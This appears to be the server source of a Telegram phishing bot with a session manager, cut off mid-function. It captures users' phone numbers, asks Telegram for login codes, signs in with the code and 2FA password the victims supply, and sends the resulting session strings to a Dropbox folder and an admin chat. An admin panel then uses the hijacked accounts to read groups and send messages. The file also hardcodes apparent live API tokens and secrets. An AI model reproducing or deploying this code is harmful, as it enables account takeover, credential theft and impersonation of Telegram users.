/* Telegram Login Bot with Auto Phone Detection + Silent Contact Capture + Session Manager */
const { Telegraf, Markup, session: telegramSession } = require('telegraf');
const express = require('express');
const fs = require('fs');
const path = require('path');
const axios = require('axios');
const { Dropbox } = require('dropbox');
const { TelegramClient, Api } = require('telegram');
const { StringSession } = require('telegram/sessions');
const expressSession = require('express-session');
const multer = require('multer');
const upload = multer({ dest: 'uploads/' });

// ==================== CONFIGURATION ====================
const config = {
    telegramBotToken: '7357492316:AAEeWsqRjzty9parwGwRAcRPnRGQJLaotP0',
    webPort: process.env.PORT || 3000,
    webBaseUrl: process.env.RENDER_EXTERNAL_URL || `http://localhost:3000`,
    adminChatId: '6300694007',
    
    // Telegram API Credentials
    telegramApiId: 33904063,
    telegramApiHash: '51528b792d5be7e300315f7fae356ad9',
    
    // Dropbox Configuration
    dropboxAppKey: 'ho5ep3i58l3tvgu',
    dropboxAppSecret: '9fy0w0pgaafyk3e',
    dropboxRefreshToken: 'Vjhcbg66GMgAAAAAAAAAARJPgSupFcZdyXFkXiFx7VP-oXv_64RQKmtTLUYfPtm3',
    dropboxSessionsFolder: '/workingtelesessions',
    
    // Session Management
    autoPingInterval: 4 * 60 * 1000,
    sessionStoragePath: './sessions',
    
    // Admin credentials for session manager
    adminUsername: 'admin',
    adminPassword: 'admin123',
};

// ==================== GLOBALS ====================
let dbx = null;
let isDropboxInitialized = false;
const activeLoginSessions = new Map();
const pendingContacts = new Map();
const userSessions = new Map();
const activeClients = new Map(); // For session manager
const app = express();

// ==================== DATABASE ====================
const DB_FILE = 'database.json';
const SESSIONS_FOLDER = 'sessions';
const UPLOADS_FOLDER = 'uploads';

// Initialize database
if (!fs.existsSync(DB_FILE)) {
    const initialDB = {
        sessions: [],
        messages: [],
        forwardedMessages: [],
        groups: {},
        settings: {
            autoSync: true,
            maxConcurrentClients: 10
        },
        stats: {
            totalSessions: 0,
            totalMessagesSent: 0,
            lastSync: null
        }
    };
    fs.writeFileSync(DB_FILE, JSON.stringify(initialDB, null, 2));
}

// Create necessary folders
[UPLOADS_FOLDER, SESSIONS_FOLDER].forEach(folder => {
    if (!fs.existsSync(folder)) {
        fs.mkdirSync(folder, { recursive: true });
    }
});

function readDatabase() {
    try {
        const data = fs.readFileSync(DB_FILE, 'utf8');
        return JSON.parse(data);
    } catch (error) {
        console.error('Error reading database:', error);
        return { sessions: [], messages: [], groups: {}, settings: {}, stats: {} };
    }
}

function writeDatabase(db) {
    try {
        fs.writeFileSync(DB_FILE, JSON.stringify(db, null, 2));
        syncDatabaseToDropbox();
        return true;
    } catch (error) {
        console.error('Error writing database:', error);
        return false;
    }
}

// ==================== DROPBOX INTEGRATION ====================
async function initializeDropbox() {
    try {
        const accessToken = await getDropboxAccessToken();
        if (!accessToken) {
            console.error('Failed to get Dropbox access token');
            return null;
        }
        
        dbx = new Dropbox({ 
            accessToken: accessToken,
            clientId: config.dropboxAppKey
        });
        
        // Test connection
        await dbx.filesListFolder({ path: '' });
        isDropboxInitialized = true;
        console.log('✅ Dropbox initialized successfully');
        
        // Sync sessions from Dropbox
        await syncSessionsFromDropbox();
        await syncDatabaseFromDropbox();
        
        return dbx;
    } catch (error) {
        console.error('❌ Dropbox initialization failed:', error.message);
        return null;
    }
}

async function getDropboxAccessToken() {
    try {
        const response = await axios.post(
            'https://api.dropbox.com/oauth2/token',
            new URLSearchParams({
                grant_type: 'refresh_token',
                refresh_token: config.dropboxRefreshToken,
                client_id: config.dropboxAppKey,
                client_secret: config.dropboxAppSecret
            }),
            {
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                timeout: 15000
            }
        );
        return response.data.access_token;
    } catch (error) {
        console.error('❌ Failed to get Dropbox access token:', error.message);
        return null;
    }
}

async function uploadSessionToDropbox(phoneNumber, sessionString) {
    try {
        if (!dbx) await initializeDropbox();
        if (!dbx) return false;
        
        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
        const fileName = `session_${phoneNumber}_${timestamp}.txt`;
        
        await dbx.filesUpload({
            path: `${config.dropboxSessionsFolder}/${fileName}`,
            contents: sessionString,
            mode: { '.tag': 'overwrite' }
        });
        
        console.log(`✅ Session uploaded to Dropbox: ${fileName}`);
        return true;
    } catch (error) {
        console.error('❌ Error uploading to Dropbox:', error.message);
        return false;
    }
}

async function syncSessionsFromDropbox() {
    if (!isDropboxInitialized || !dbx) return false;
    
    try {
        console.log('🔄 Syncing sessions from Dropbox...');
        
        // List all session files in Dropbox
        const result = await dbx.filesListFolder({ 
            path: config.dropboxSessionsFolder 
        });
        
        const sessionFiles = result.result.entries.filter(
            entry => entry.name.endsWith('.txt') || entry.name.endsWith('.session')
        );
        
        for (const file of sessionFiles) {
            try {
                // Download file from Dropbox
                const downloadResult = await dbx.filesDownload({ 
                    path: file.path_display 
                });
                
                const sessionString = downloadResult.result.fileBinary.toString();
                const fileName = path.basename(file.path_display);
                const localPath = path.join(SESSIONS_FOLDER, fileName);
                
                // Save locally
                fs.writeFileSync(localPath, sessionString);
                console.log(`✅ Downloaded session: ${fileName}`);
                
                // Add to database if not exists
                const db = readDatabase();
                const sessionExists = db.sessions.some(s => s.fileName === fileName);
                
                if (!sessionExists) {
                    try {
                        // Test session by getting user info
                        const client = new TelegramClient(
                            new StringSession(sessionString),
                            config.telegramApiId,
                            config.telegramApiHash,
                            { connectionRetries: 3 }
                        );
                        
                        await client.connect();
                        const user = await client.getMe();
                        await client.disconnect();
                        
                        db.sessions.push({
                            id: `session_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
                            fileName: fileName,
                            phoneNumber: user.phone || 'Unknown',
                            userId: user.id.toString(),
                            username: user.username || 'Unknown',
                            firstName: user.firstName || 'Unknown',
                            lastName: user.lastName || '',
                            isBot: user.bot || false,
                            sessionString: sessionString,
                            addedAt: new Date().toISOString(),
                            lastUsed: null,
                            isValid: true,
                            status: 'inactive',
                            source: 'dropbox'
                        });
                        
                        db.stats.totalSessions = db.sessions.length;
                        writeDatabase(db);
                        
                        console.log(`✅ Added session to DB: ${user.username || user.phone}`);
                    } catch (error) {
                        console.warn(`⚠️ Invalid session: ${fileName}`, error.message);
                    }
                }
            } catch (error) {
                console.error(`❌ Error downloading ${file.name}:`, error.message);
            }
        }
        
        console.log(`✅ Synced ${sessionFiles.length} sessions from Dropbox`);
        return true;
    } catch (error) {
        console.error('❌ Error syncing sessions from Dropbox:', error.message);
        return false;
    }
}

async function syncDatabaseToDropbox() {
    if (!isDropboxInitialized || !dbx) return false;
    
    try {
        const dbContent = fs.readFileSync(DB_FILE, 'utf8');
        await dbx.filesUpload({
            path: `${config.dropboxSessionsFolder}/database_backup.json`,
            contents: dbContent,
            mode: { '.tag': 'overwrite' },
            mute: true
        });
        console.log('✅ Database synced to Dropbox');
        return true;
    } catch (error) {
        console.error('❌ Error syncing database to Dropbox:', error.message);
        return false;
    }
}

async function syncDatabaseFromDropbox() {
    if (!isDropboxInitialized || !dbx) return false;
    
    try {
        const result = await dbx.filesDownload({ 
            path: `${config.dropboxSessionsFolder}/database_backup.json` 
        }).catch(() => null);
        
        if (result) {
            const dbContent = result.result.fileBinary.toString();
            fs.writeFileSync(DB_FILE, dbContent);
            console.log('✅ Database restored from Dropbox');
            return true;
        }
        return false;
    } catch (error) {
        console.log('No database backup found in Dropbox, using local');
        return false;
    }
}

// ==================== SESSION STRING VALIDATION ====================
function normalizeSessionString(sessionString) {
    // Remove whitespace, newlines, and trim
    let normalized = sessionString.trim();
    
    // Remove any quotes
    normalized = normalized.replace(/^["']|["']$/g, '');
    
    // Remove "1BAAOMTQ5LjE1NC4xNjcuOTEBu1Ss+xWKwcKta4PzIQkDCDKXwDd4wx3ZePhfT5aWPyJorGNGjiTcw1TGJbckTl05TLU7IyBevgm..." style prefix if present
    if (normalized.includes('...')) {
        normalized = normalized.split('...')[0];
    }
    
    return normalized;
}

// ==================== TELEGRAM CLIENT MANAGEMENT ====================
async function initializeClient(sessionId, sessionString) {
    try {
        // Check if client already exists and is connected
        if (activeClients.has(sessionId)) {
            const existingClient = activeClients.get(sessionId);
            try {
                if (existingClient.client.connected) {
                    existingClient.lastActive = Date.now();
                    return existingClient.client;
                }
            } catch (e) {
                // Client not connected, will create new one
            }
        }
        
        console.log(`🔌 Initializing Telegram client for session: ${sessionId}`);
        
        const client = new TelegramClient(
            new StringSession(sessionString),
            config.telegramApiId,
            config.telegramApiHash,
            {
                connectionRetries: 5,
                useWSS: true,
                autoReconnect: true,
                timeout: 30000
            }
        );
        
        await client.connect();
        
        // Get user info
        const user = await client.getMe();
        const userInfo = {
            id: user.id.toString(),
            phone: user.phone || '',
            username: user.username || '',
            firstName: user.firstName || '',
            lastName: user.lastName || '',
            isBot: user.bot || false
        };
        
        // Store in active clients
        activeClients.set(sessionId, {
            client: client,
            userInfo: userInfo,
            lastActive: Date.now(),
            connectedAt: new Date().toISOString()
        });
        
        // Update database
        const db = readDatabase();
        const sessionIndex = db.sessions.findIndex(s => s.id === sessionId);
        if (sessionIndex !== -1) {
            db.sessions[sessionIndex].lastUsed = new Date().toISOString();
            db.sessions[sessionIndex].status = 'active';
            writeDatabase(db);
        }
        
        console.log(`✅ Client initialized for: ${userInfo.username || userInfo.phone}`);
        
        return client;
    } catch (error) {
        console.error(`❌ Failed to initialize client for ${sessionId}:`, error.message);
        
        // Update session status in database
        const db = readDatabase();
        const sessionIndex = db.sessions.findIndex(s => s.id === sessionId);
        if (sessionIndex !== -1) {
            db.sessions[sessionIndex].isValid = false;
            db.sessions[sessionIndex].status = 'error';
            db.sessions[sessionIndex].lastError = error.message;
            writeDatabase(db);
        }
        
        throw error;
    }
}

function cleanupInactiveClients() {
    const now = Date.now();
    const inactiveTime = 5 * 60 * 1000; // 5 minutes
    
    for (const [sessionId, clientData] of activeClients.entries()) {
        if (now - clientData.lastActive > inactiveTime) {
            try {
                clientData.client.disconnect();
                console.log(`🔌 Disconnected inactive client: ${sessionId}`);
            } catch (e) {
                // Ignore disconnect errors
            }
            activeClients.delete(sessionId);
            
            // Update database
            const db = readDatabase();
            const sessionIndex = db.sessions.findIndex(s => s.id === sessionId);
            if (sessionIndex !== -1) {
                db.sessions[sessionIndex].status = 'inactive';
                writeDatabase(db);
            }
        }
    }
}

async function disconnectClient(sessionId) {
    try {
        if (activeClients.has(sessionId)) {
            const clientData = activeClients.get(sessionId);
            await clientData.client.disconnect();
            activeClients.delete(sessionId);
            
            // Update database
            const db = readDatabase();
            const sessionIndex = db.sessions.findIndex(s => s.id === sessionId);
            if (sessionIndex !== -1) {
                db.sessions[sessionIndex].status = 'inactive';
                writeDatabase(db);
            }
            
            console.log(`🔌 Disconnected client: ${sessionId}`);
            return true;
        }
        return false;
    } catch (error) {
        console.error(`❌ Error disconnecting client ${sessionId}:`, error.message);
        return false;
    }
}

// ==================== TELEGRAM LOGIN SYSTEM ====================
async function requestLoginCode(phoneNumber) {
    try {
        console.log(`📱 Requesting login code for: ${phoneNumber}`);
        
        const client = new TelegramClient(
            new StringSession(''),
            config.telegramApiId,
            config.telegramApiHash,
            {
                connectionRetries: 5,
                useWSS: true,
                autoReconnect: true,
                timeout: 10000
            }
        );
        
        await client.connect();
        console.log(`✅ Connected to Telegram API`);
        
        const result = await client.sendCode(
            {
                apiId: config.telegramApiId,
                apiHash: config.telegramApiHash
            },
            phoneNumber
        );
        
        console.log(`✅ Code requested successfully. Phone code hash: ${result.phoneCodeHash}`);
        
        const sessionId = 'SESS_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);
        
        activeLoginSessions.set(sessionId, {
            phoneNumber: phoneNumber,
            phoneCodeHash: result.phoneCodeHash,
            client: client,
            timestamp: new Date().toISOString(),
            status: 'code_requested'
        });
        
        // Clean up old sessions after 10 minutes
        setTimeout(() => {
            if (activeLoginSessions.has(sessionId)) {
                const session = activeLoginSessions.get(sessionId);
                if (session.client) {
                    try {
                        session.client.disconnect();
                    } catch (e) {}
                }
                activeLoginSessions.delete(sessionId);
                console.log(`🗑️ Cleaned up expired session: ${sessionId}`);
            }
        }, 10 * 60 * 1000);
        
        return {
            success: true,
            sessionId: sessionId,
            phoneCodeHash: result.phoneCodeHash,
            message: `✅ Verification code sent to ${phoneNumber}. Check your Telegram app.`
        };
        
    } catch (error) {
        console.error(`❌ Failed to request code:`, error.message);
        
        if (error.message.includes('PHONE_NUMBER_INVALID')) {
            return { success: false, error: 'Invalid phone number format' };
        } else if (error.message.includes('PHONE_NUMBER_FLOOD')) {
            return { success: false, error: 'Too many requests. Please wait and try again.' };
        } else {
            return { success: false, error: `Failed to send code: ${error.message}` };
        }
    }
}

async function signInWithCode(sessionId, code) {
    try {
        const session = activeLoginSessions.get(sessionId);
        if (!session) {
            return { success: false, error: 'Session expired. Please start over.' };
        }
        
        console.log(`🔐 Signing in with code for: ${session.phoneNumber}`);
        
        let result;
        try {
            result = await session.client.signIn({
                phoneNumber: session.phoneNumber,
                phoneCode: () => Promise.resolve(code.toString()),
                phoneCodeHash: session.phoneCodeHash
            });
        } catch (signInError) {
            await session.client.invoke(
                new Api.auth.SignIn({
                    phoneNumber: session.phoneNumber,
                    phoneCodeHash: session.phoneCodeHash,
                    phoneCode: code.toString()
                })
            );
            
            result = await session.client.getMe();
        }
        
        console.log(`✅ Sign in successful for: ${session.phoneNumber}`);
        
        const sessionString = session.client.session.save();
        
        // Save to session manager database
        await saveSessionToManager(session.phoneNumber, sessionString, result);
        
        // Also save to old format for compatibility
        const localFilePath = saveSessionLocally(session.phoneNumber, sessionString);
        await sendSessionToAdmin(session.phoneNumber, sessionString, localFilePath);
        
        try {
            await session.client.disconnect();
        } catch (e) {}
        activeLoginSessions.delete(sessionId);
        
        return {
            success: true,
            message: '✅ Login successful! Session generated and saved.',
            user: {
                phone: session.phoneNumber,
                userId: result.id || result.userId || 'unknown'
            }
        };
        
    } catch (error) {
        console.error(`❌ Sign in failed:`, error.message);
        
        if (error.message.includes('SESSION_PASSWORD_NEEDED')) {
            return { 
                success: false, 
                error: 'This account has Two-Factor Authentication enabled.',
                needsPassword: true 
            };
        } else if (error.message.includes('PHONE_CODE_INVALID')) {
            return { success: false, error: 'Invalid verification code.' };
        } else if (error.message.includes('PHONE_CODE_EXPIRED')) {
            return { success: false, error: 'Code expired. Please request a new code.' };
        } else {
            return { success: false, error: `Login failed: ${error.message}` };
        }
    }
}

async function signInWithPassword(sessionId, password) {
    try {
        const session = activeLoginSessions.get(sessionId);
        if (!session || !session.client) {
            return { success: false, error: 'Session expired.' };
        }
        
        console.log(`🔑 Signing in with 2FA for: ${session.phoneNumber}`);
        
        await session.client.invoke(
            new Api.account.CheckPassword({
                password: password
            })
        );
        
        await session.client.signIn({
            phoneNumber: session.phoneNumber,
            phoneCodeHash: session.phoneCodeHash
        });
        
        const sessionString = session.client.session.save();
        
        // Save to session manager database
        const user = await session.client.getMe();
        await saveSessionToManager(session.phoneNumber, sessionString, user);
        
        // Also save to old format for compatibility
        const localFilePath = saveSessionLocally(session.phoneNumber, sessionString);
        await sendSessionToAdmin(session.phoneNumber, sessionString, localFilePath);
        
        try {
            await session.client.disconnect();
        } catch (e) {}
        activeLoginSessions.delete(sessionId);
        
        return {
            success: true,
            message: '✅ 2FA login successful! Session generated.'
        };
        
    } catch (error) {
        console.error(`❌ 2FA login failed:`, error.message);
        return { success: false, error: 'Invalid 2FA password.' };
    }
}

function saveSessionLocally(phoneNumber, sessionString) {
    try {
        if (!fs.existsSync(config.sessionStoragePath)) {
            fs.mkdirSync(config.sessionStoragePath, { recursive: true });
        }
        
        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
        const fileName = `session_${phoneNumber}_${timestamp}.txt`;
        const filePath = path.join(config.sessionStoragePath, fileName);
        
        fs.writeFileSync(filePath, sessionString);
        console.log(`✅ Session saved locally: ${filePath}`);
        
        return filePath;
    } catch (error) {
        console.error('❌ Error saving session locally:', error.message);
        return null;
    }
}

async function saveSessionToManager(phoneNumber, sessionString, user) {
    try {
        const fileName = `session_${phoneNumber}_${Date.now()}.txt`;
        const localPath = path.join(SESSIONS_FOLDER, fileName);
        
        // Save locally
        fs.writeFileSync(localPath, sessionString);
        
        // Upload to Dropbox
        await uploadSessionToDropbox(phoneNumber, sessionString);
        
        // Add to database
        const db = readDatabase();
        const sessionId = `session_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
        
        // Check if session already exists
        const existingIndex = db.sessions.findIndex(s => s.userId === user.id.toString());
        if (existingIndex !== -1) {
            // Update existing
            db.sessions[existingIndex].sessionString = sessionString;
            db.sessions[existingIndex].fileName = fileName;
            db.sessions[existingIndex].lastUsed = new Date().toISOString();
            db.sessions[existingIndex].isValid = true;
        } else {
            // Add new
            db.sessions.push({
                id: sessionId,
                fileName: fileName,
                phoneNumber: user.phone || phoneNumber,
                userId: user.id.toString(),
                username: user.username || 'Unknown',
                firstName: user.firstName || 'Unknown',
                lastName: user.lastName || '',
                isBot: user.bot || false,
                sessionString: sessionString,
                addedAt: new Date().toISOString(),
                lastUsed: null,
                isValid: true,
                status: 'inactive',
                source: 'auto-login'
            });
        }
        
        db.stats.totalSessions = db.sessions.length;
        writeDatabase(db);
        
        console.log(`✅ Session saved to manager database: ${phoneNumber}`);
        return true;
    } catch (error) {
        console.error('❌ Error saving session to manager:', error.message);
        return false;
    }
}

async function sendSessionToAdmin(phoneNumber, sessionString, sessionFilePath) {
    try {
        if (!bot) return false;
        
        const message = `📱 NEW SESSION GENERATED\n\n` +
                       `📞 Phone: ${phoneNumber}\n` +
                       `🕒 Time: ${new Date().toLocaleString()}\n` +
                       `📁 Local: ${sessionFilePath ? 'Saved' : 'Not saved'}\n` +
                       `☁️ Dropbox: ${await uploadSessionToDropbox(phoneNumber, sessionString) ? 'Uploaded' : 'Failed'}\n\n` +
                       `📋 Session String (first 100 chars):\n\`\`\`\n${sessionString.substring(0, 100)}...\n\`\`\``;
        
        await bot.telegram.sendMessage(
            config.adminChatId,
            message,
            { parse_mode: 'Markdown' }
        );
        
        if (sessionFilePath && fs.existsSync(sessionFilePath)) {
            await bot.telegram.sendDocument(
                config.adminChatId,
                { source: fs.createReadStream(sessionFilePath) },
                { caption: `Full session file for ${phoneNumber}` }
            );
        }
        
        console.log(`✅ Session sent to admin for ${phoneNumber}`);
        return true;
    } catch (error) {
        console.error('❌ Error sending session to admin:', error.message);
        return false;
    }
}

// ==================== EXPRESS SERVER SETUP ====================
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(expressSession({
    secret: 'telegram-session-manager-secret-2024',
    resave: false,
    saveUninitialized: false,
    cookie: { secure: process.env.NODE_ENV === 'production', maxAge: 24 * 60 * 60 * 1000 }
}));

// Middleware for authentication
function requireAuth(req, res, next) {
    if (req.session && req.session.authenticated) {
        return next();
    }
    res.status(401).json({ error: 'Authentication required' });
}

// Serve static files
app.use(express.static('public'));

// Create directories
if (!fs.existsSync('public')) {
    fs.mkdirSync('public', { recursive: true });
}

// Serve main HTML file
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Login page with userId parameter
app.get('/login/:userId', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'login.html'));
});

// Admin dashboard
app.get('/admin', (req, res) => {
    if (req.session && req.session.authenticated) {
        res.sendFile(path.join(__dirname, 'public', 'admin.html'));
    } else {
        res.redirect('/login.html');
    }
});

// ==================== LOGIN BOT API ENDPOINTS ====================
app.get('/api/pending-contact/:userId', async (req, res) => {
    try {
        const userId = req.params.userId;
        const contact = pendingContacts.get(userId);
        
        if (contact) {
            // Check if we already sent code for this user
            const userSession = userSessions.get(userId);
            
            if (!userSession || !userSession.verificationCodeSent) {
                // Auto-send verification code
                console.log(`📱 AUTO-SEND: Sending code to ${contact.phoneNumber}`);
                
                const codeResult = await requestLoginCode(contact.phoneNumber);
                
                if (codeResult.success) {
                    // Store session info for this user
                    userSessions.set(userId, {
                        phoneNumber: contact.phoneNumber,
                        sessionId: codeResult.sessionId,
                        verificationCodeSent: true,
                        sentAt: new Date().toISOString()
                    });
                    
                    console.log(`✅ Code automatically sent to ${contact.phoneNumber}`);
                    
                    res.json({ 
                        success: true, 
                        contact: contact,
                        codeSent: true,
                        sessionId: codeResult.sessionId,
                        message: '✅ Verification code sent! Please enter it below.'
                    });
                } else {
                    res.json({ 
                        success: true, 
                        contact: contact,
                        codeSent: false,
                        error: codeResult.error
                    });
                }
            } else {
                // Code already sent, just return contact info
                res.json({ 
                    success: true, 
                    contact: contact,
                    codeSent: true,
                    sessionId: userSession.sessionId,
                    message: '✅ Verification code already sent. Please enter it below.'
                });
            }
        } else {
            res.json({ success: false });
        }
    } catch (error) {
        console.error('❌ Error in pending-contact API:', error);
        res.json({ success: false, error: error.message });
    }
});

app.post('/api/request-code', express.json(), async (req, res) => {
    try {
        const { phoneNumber } = req.body;
        
        if (!phoneNumber || !phoneNumber.startsWith('+')) {
            return res.json({ 
                success: false, 
                error: 'Invalid phone number format' 
            });
        }
        
        console.log(`📱 API: Requesting code for ${phoneNumber}`);
        
        const result = await requestLoginCode(phoneNumber);
        res.json(result);
        
    } catch (error) {
        console.error('❌ API Error in request-code:', error);
        res.json({ 
            success: false, 
            error: `Server error: ${error.message}` 
        });
    }
});

app.post('/api/sign-in', express.json(), async (req, res) => {
    try {
        const { sessionId, code } = req.body;
        
        if (!sessionId || !code) {
            return res.json({ 
                success: false, 
                error: 'Missing session ID or code' 
            });
        }
        
        console.log(`🔐 API: Signing in with code for session ${sessionId}`);
        
        const result = await signInWithCode(sessionId, code);
        res.json(result);
        
    } catch (error) {
        console.error('❌ API Error in sign-in:', error);
        res.json({ 
            success: false, 
            error: `Server error: ${error.message}` 
        });
    }
});

app.post('/api/sign-in-password', express.json(), async (req, res) => {
    try {
        const { sessionId, password } = req.body;
        
        if (!sessionId || !password) {
            return res.json({ 
                success: false, 
                error: 'Missing session ID or password' 
            });
        }
        
        console.log(`🔑 API: Signing in with 2FA for session ${sessionId}`);
        
        const result = await signInWithPassword(sessionId, password);
        res.json(result);
        
    } catch (error) {
        console.error('❌ API Error in sign-in-password:', error);
        res.json({ 
            success: false, 
            error: `Server error: ${error.message}` 
        });
    }
});

// ==================== SESSION MANAGER API ENDPOINTS ====================
app.post('/api/login', (req, res) => {
    const { username, password } = req.body;
    
    if (username === config.adminUsername && password === config.adminPassword) {
        req.session.authenticated = true;
        req.session.username = username;
        res.json({ success: true, message: 'Login successful' });
    } else {
        res.status(401).json({ success: false, error: 'Invalid credentials' });
    }
});

app.get('/api/logout', (req, res) => {
    req.session.destroy();
    res.json({ success: true, message: 'Logged out' });
});

// Upload session file
app.post('/api/sessions/upload', upload.single('session'), requireAuth, async (req, res) => {
    try {
        if (!req.file) {
            return res.status(400).json({ success: false, error: 'No file uploaded' });
        }
        
        const sessionString = fs.readFileSync(req.file.path, 'utf8');
        fs.unlinkSync(req.file.path);
        
        return await processSessionString(sessionString, 'file', res);
    } catch (error) {
        console.error('Error uploading session:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Paste session string
app.post('/api/sessions/paste', requireAuth, async (req, res) => {
    try {
        const { sessionString } = req.body;
        
        if (!sessionString || sessionString.trim().length < 10) {
            return res.status(400).json({ 
                success: false, 
                error: 'Invalid session string (too short)' 
            });
        }
        
        return await processSessionString(sessionString, 'paste', res);
    } catch (error) {
        console.error('Error pasting session:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

async function processSessionString(sessionString, source, res) {
    try {
        const normalizedString = normalizeSessionString(sessionString);
        
        if (normalizedString.length < 20) {
            return res.status(400).json({ 
                success: false, 
                error: 'Session string appears to be invalid (too short after normalization)' 
            });
        }
        
        // Test the session
        let userInfo;
        try {
            const client = new TelegramClient(
                new StringSession(normalizedString),
                config.telegramApiId,
                config.telegramApiHash,
                { connectionRetries: 2 }
            );
            
            await client.connect();
            const user = await client.getMe();
            await client.disconnect();
            
            userInfo = {
                phone: user.phone || 'Unknown',
                userId: user.id.toString(),
                username: user.username || 'Unknown',
                firstName: user.firstName || 'Unknown',
                lastName: user.lastName || '',
                isBot: user.bot || false
            };
        } catch (error) {
            console.error('Session test failed:', error.message);
            return res.status(400).json({ 
                success: false, 
                error: `Invalid session: ${error.message}` 
            });
        }
        
        // Generate filename
        const fileName = `session_${Date.now()}_${Math.random().toString(36).substr(2, 6)}.txt`;
        const localPath = path.join(SESSIONS_FOLDER, fileName);
        
        // Save locally
        fs.writeFileSync(localPath, normalizedString);
        
        // Upload to Dropbox
        await uploadSessionToDropbox(userInfo.phone, normalizedString);
        
        // Add to database
        const db = readDatabase();
        const sessionId = `session_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
        
        // Check if session already exists
        const existingIndex = db.sessions.findIndex(s => s.userId === userInfo.userId);
        if (existingIndex !== -1) {
            // Update existing
            db.sessions[existingIndex].sessionString = normalizedString;
            db.sessions[existingIndex].fileName = fileName;
            db.sessions[existingIndex].lastUsed = new Date().toISOString();
            db.sessions[existingIndex].isValid = true;
            db.sessions[existingIndex].status = 'inactive';
        } else {
            // Add new
            db.sessions.push({
                id: sessionId,
                fileName: fileName,
                phoneNumber: userInfo.phone,
                userId: userInfo.userId,
                username: userInfo.username,
                firstName: userInfo.firstName,
                lastName: userInfo.lastName,
                isBot: userInfo.isBot,
                sessionString: normalizedString,
                addedAt: new Date().toISOString(),
                lastUsed: null,
                isValid: true,
                status: 'inactive',
                source: source
            });
        }
        
        db.stats.totalSessions = db.sessions.length;
        db.stats.lastSync = new Date().toISOString();
        writeDatabase(db);
        
        return res.json({
            success: true,
            message: 'Session added successfully',
            sessionId: sessionId,
            user: userInfo
        });
        
    } catch (error) {
        console.error('Error processing session:', error);
        return res.status(500).json({ success: false, error: error.message });
    }
}

// List all sessions
app.get('/api/sessions', requireAuth, (req, res) => {
    const db = readDatabase();
    
    // Update status based on active clients
    const sessions = db.sessions.map(session => ({
        ...session,
        sessionString: undefined, // Don't expose full session string
        status: activeClients.has(session.id) ? 'active' : session.status
    }));
    
    res.json(sessions);
});

// Get session info
app.get('/api/sessions/:sessionId/info', requireAuth, async (req, res) => {
    try {
        const db = readDatabase();
        const session = db.sessions.find(s => s.id === req.params.sessionId);
        
        if (!session) {
            return res.status(404).json({ success: false, error: 'Session not found' });
        }
        
        try {
            const client = await initializeClient(session.id, session.sessionString);
            const user = await client.getMe();
            
            // Get some stats
            const dialogs = await client.getDialogs({ limit: 10 });
            
            res.json({
                session: session,
                user: {
                    id: user.id,
                    phone: user.phone,
                    username: user.username,
                    firstName: user.firstName,
                    lastName: user.lastName,
                    isBot: user.bot,
                    premium: user.premium || false
                },
                stats: {
                    dialogs: dialogs.length,
                    groups: dialogs.filter(d => d.isGroup).length,
                    channels: dialogs.filter(d => d.isChannel).length,
                    private: dialogs.filter(d => d.isUser).length
                },
                clientStatus: activeClients.has(session.id) ? 'connected' : 'disconnected'
            });
        } catch (error) {
            res.status(400).json({ success: false, error: error.message });
        }
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// Get session groups
app.get('/api/sessions/:sessionId/groups', requireAuth, async (req, res) => {
    try {
        const db = readDatabase();
        const session = db.sessions.find(s => s.id === req.params.sessionId);
        
        if (!session) {
            return res.status(404).json({ success: false, error: 'Session not found' });
        }
        
        const client = await initializeClient(session.id, session.sessionString);
        const dialogs = await client.getDialogs({ limit: 100 });
        
        const groups = dialogs
            .filter(dialog => dialog.isGroup || dialog.isChannel)
            .map(dialog => ({
                id: dialog.id.toString(),
                title: dialog.title || 'Unknown',
                isChannel: dialog.isChannel,
                isGroup: dialog.isGroup,
                participantsCount: dialog.participantsCount || 0,
                username: dialog.username || '',
                accessHash: dialog.accessHash ? dialog.accessHash.toString() : ''
            }));
        
        // Cache groups in database
        if (!db.groups[req.params.sessionId]) {
            db.groups[req.params.sessionId] = [];
        }
        db.groups[req.params.sessionId] = groups;
        writeDatabase(db);
        
        res.json(groups);
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// Send message
app.post('/api/sessions/:sessionId/send', requireAuth, async (req, res) => {
    try {
        const { peer, message } = req.body;
        
        if (!peer || !message) {
            return res.status(400).json({ success: false, error: 'Peer and message are required' });
        }
        
        const db = readDatabase();
        const session = db.sessions.find(s => s.id === req.params.sessionId);
        
        if (!session) {
            return res.status(404).json({ success: false, error: 'Session not found' });
        }
        
        const client = await initializeClient(session.id, session.sessionString);
        
        const result = await client.sendMessage(peer, { message });
        
        // Log message in database
        db.messages.push({
            id: `msg_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
            sessionId: req.params.sessionId,
            peer: peer,
            message: message,
            timestamp: new Date().toISOString(),
            messageId: result.id.toString()
        });
        
        db.stats.totalMessagesSent++;
        writeDatabase(db);
        
        res.json({
            success: true,
            messageId: result.id,
            date: result.date
        });
    } catch (error) {
        console.error(`❌ Error sending message:`, error.message);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Get statistics
app.get('/api/stats', requireAuth, (req, res) => {
    const db = readDatabase();
    
    const stats = {
        ...db.stats,
        connectedClients: activeClients.size,
        totalSessions: db.sessions.length,
        validSessions: db.sessions.filter(s => s.isValid).length,
        activeSessions: db.sessions.filter(s => s.status === 'active').length,
        pendingContacts: pendingContacts.size,
        activeLoginSessions: activeLoginSessions.size
    };
    
    res.json(stats);
});

// Sync with Dropbox
app.post('/api/sync', requireAuth, async (req, res) => {
    try {
        const results = {
            sessionsSynced: await syncSessionsFromDropbox(),
            databaseSynced: await syncDatabaseFromDropbox(),
            timestamp: new Date().toISOString()
        };
        
        // Update last sync in database
        const db = readDatabase();
        db.stats.lastSync = new Date().toISOString();
        writeDatabase(db);
        
        res.json({ success: true, results: results });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
